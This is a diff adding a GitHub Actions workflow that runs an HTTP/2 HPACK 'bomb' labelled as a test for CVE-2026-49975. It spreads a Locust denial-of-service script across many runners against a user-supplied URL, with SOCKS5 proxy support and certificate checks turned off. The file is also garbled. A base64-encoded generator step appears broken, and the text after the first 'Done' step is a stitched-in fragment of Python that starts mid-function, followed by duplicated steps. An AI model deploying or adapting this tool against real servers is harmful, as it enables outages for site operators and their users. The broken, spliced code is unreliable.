@@ -1,0 +1,215 @@
+name: CVE-2026-49975 Test
+
+on:
+  workflow_dispatch:
+    inputs:
+      target_url:
+        description: 'Target URL'
+        required: true
+        default: 'https://example.com'
+      threads_per_shard:
+        description: 'Threads per shard'
+        required: true
+        default: '100'
+      shard_count:
+        description: 'Shard count'
+        required: true
+        default: '15'
+      run_time_minutes:
+        description: 'Run time (minutes)'
+        required: true
+        default: '5'
+      hpack_references:
+        description: 'HPACK references'
+        required: false
+        default: '2048'
+      hold_seconds:
+        description: 'Hold seconds'
+        required: false
+        default: '15'
+      proxy_url:
+        description: 'Proxy URL (empty for direct)'
+        required: false
+        default: ''
+
+jobs:
+  generate-matrix:
+    runs-on: ubuntu-latest
+    outputs:
+      matrix_array: ${{ steps.set-matrix.outputs.matrix_array }}
+    steps:
+      - id: set-matrix
+        run: |
+          SHARD_COUNT=${{ github.event.inputs.shard_count }}
+          JSON_ARRAY=$(python3 -c "import json; print(json.dumps(list(range(1, $SHARD_COUNT + 1))))")
+          echo "matrix_array=$JSON_ARRAY" >> $GITHUB_OUTPUT
+
+  bomb-attack:
+    needs: generate-matrix
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        shard: ${{ fromJson(needs.generate-matrix.outputs.matrix_array) }}
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Set up Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.10'
+
+      - name: Install
+        run: pip install locust==2.32.2 PySocks
+
+      - name: Generate locustfile
+        run: |
+          echo "aW1wb3J0IG9zCmltcG9ydCBzZWNyZXRzCmltcG9ydCBiYXNlNjQKCmNvZGUgPSBiYXNlNjQuZGVjb2RlKG1lbnUuZ2V0KCdMT0NVU1RfRklMRScpKS5kZWNvZGUoJ3V0Zi04JykKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAgIHdpdGggb3BlbigneC5weScsICd3JykgYXMgZjoKICAgICAgICBmLndyaXRlKGNvZGUpCiAgICAgICAgZi5mbHVzaCgpCg==" | base64 -d > gen.py
+          python3 gen.py
+          rm gen.py
+          head -3 locustfile.py
+
+      - name: Run
+        run: |
+          locust -f locustfile.py \
+            --headless \
+            -u ${{ github.event.inputs.threads_per_shard }} \
+            -r ${{ github.event.inputs.threads_per_shard }} \
+            --run-time ${{ github.event.inputs.run_time_minutes }}m \
+            --host ${{ github.event.inputs.target_url }}
+        env:
+          LOCUST_FILE: ${{ vars.LOCUST_FILE }}
+          LOCUST_REFERENCES: ${{ github.event.inputs.hpack_references }}
+          LOCUST_HOLD_SECONDS: ${{ github.event.inputs.hold_seconds }}
+          SOCKS5_PROXY: ${{ github.event.inputs.proxy_url }}
+
+      - name: Done
+        run: echo "Shard ${{ matrix.shard }} done"  else:
+        return None, None, None
+    if \"@\" in rest: rest = rest.split(\"@\")[-1]
+    if \":\" in rest:
+        h, ps = rest.split(\":\", 1)
+        return pt, h, int(ps.split(\"/\")[0])
+    return pt, rest, 1080
+
+def conn(addr, timeout=None, pp=None):
+    pt, ph, pp2 = pp or (None, None, None)
+    if pt and HAS_SOCKS:
+        s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
+        un = os.environ.get(\"SOCKS5_USER\", \"\")
+        pw = os.environ.get(\"SOCKS5_PASS\", \"\")
+        s.set_proxy(pt, ph, pp2, un, pw)
+        if timeout: s.settimeout(timeout)
+        s.connect(addr)
+        return s
+    return socket.create_connection(addr, timeout=timeout)
+
+PP = parse_proxy(PROXY)
+CP = b\"PRI * HTTP/2.0\\\\r\\\\n\\\\r\\\\nSM\\\\r\\\\n\\\\r\\\\n\"
+
+def bf(ft, fl, sid, pl):
+    return struct.pack(\">I\", len(pl))[1:] + struct.pack(\"BB\", ft, fl) + struct.pack(\">I\", sid & 0x7FFFFFFF) + pl
+
+def bs(iws=0, mfs=16384):
+    return bf(4, 0, 0, struct.pack(\">HI\", 4, iws) + struct.pack(\">HI\", 5, mfs))
+
+def bhf(sid, iref=2048):
+    v = b\"a\" * 255
+    ip = bytes([0x40, 6]) + b\"cookie\" + bytes([255]) + v
+    return bf(1, 5, sid, ip + bytes([0xBE]) * iref)
+
+class H2Bomb(User):
+    wait_time = constant(0)
+    rs = REFERENCES
+    sc = STREAMS
+    hs = HOLD
+    _ctx = None
+
+    @classmethod
+    def gc(cls):
+        if cls._ctx is None:
+            c = ssl.create_default_context()
+            c.set_alpn_protocols([\"h2\"])
+            c.check_hostname = False
+            c.verify_mode = ssl.CERT_NONE
+            cls._ctx = c
+        return cls._ctx
+
+    def ph(self):
+        h = self.host or \"https://127.0.0.1\"
+        if h.startswith(\"https://\"): r, t, dp = h[8:], True, 443
+        elif h.startswith(\"http://\"): r, t, dp = h[7:], False, 80
+        else: r, t, dp = h, True, 443
+        if \":\" in r:
+            hn, ps = r.split(\":\", 1)
+            return hn, int(ps.split(\"/\")[0]), t
+        return r.split(\"/\")[0], dp, t
+
+    @task
+    def attack(self):
+        hn, p, tls = self.ph()
+        sk = None
+        st = time.time()
+        exc = None
+        try:
+            sk = conn((hn, p), timeout=10.0, pp=PP)
+            if tls: sk = self.gc().wrap_socket(sk, server_hostname=hn)
+            sk.sendall(CP)
+            sk.sendall(bs(iws=0))
+            for sid in range(1, 2 * self.sc, 2):
+                sk.sendall(bhf(sid, self.rs))
+            if self.hs > 0:
+                et = time.time() + self.hs
+                while time.time() < et:
+                    try:
+                        sk.settimeout(1.0)
+                        d = sk.recv(4096)
+                        if not d: break
+                    except socket.timeout: continue
+                    except: break
+        except Exception as e:
+            exc = e
+        finally:
+            if sk:
+                try: sk.close()
+                except: pass
+            tt = int((time.time() - st) * 1000)
+            pn = \"proxy\" if PROXY else \"direct\"
+            rn = \"/ (refs=\" + str(self.rs) + \", hold=\" + str(self.hs) + \"s, via=\" + pn + \")\"
+            self.environment.events.request.fire(\"H2-BOMB\", rn, tt, 0, exc, {})
+
+@events.init.add_listener
+def start(env, **kw):
+    pd = PROXY if PROXY else \"direct\"
+    logger.info(\"=\" * 60)
+    logger.info(\"CVE-2026-49975 HPACK Bomb Test\")
+    logger.info(\"Users: \" + str(env.runner.target_user_count))
+    logger.info(\"HPACK refs: \" + str(REFERENCES))
+    logger.info(\"Hold sec: \" + str(HOLD))
+    logger.info(\"Target: \" + str(env.host))
+    logger.info(\"Proxy: \" + pd)
+    logger.info(\"=\" * 60)
+'''
+with open('locustfile.py', 'w') as f:
+    f.write(code)
+print('Generated locustfile.py')
+"
+          cat locustfile.py | head -3
+
+      - name: Run
+        run: |
+          locust -f locustfile.py \
+            --headless \
+            -u ${{ github.event.inputs.threads_per_shard }} \
+            -r ${{ github.event.inputs.threads_per_shard }} \
+            --run-time ${{ github.event.inputs.run_time_minutes }}m \
+            --host ${{ github.event.inputs.target_url }}
+        env:
+          LOCUST_REFERENCES: ${{ github.event.inputs.hpack_references }}
+          LOCUST_HOLD_SECONDS: ${{ github.event.inputs.hold_seconds }}
+          SOCKS5_PROXY: ${{ github.event.inputs.proxy_url }}
+
+      - name: Done
+        run: echo "Shard ${{ matrix.shard }} done"
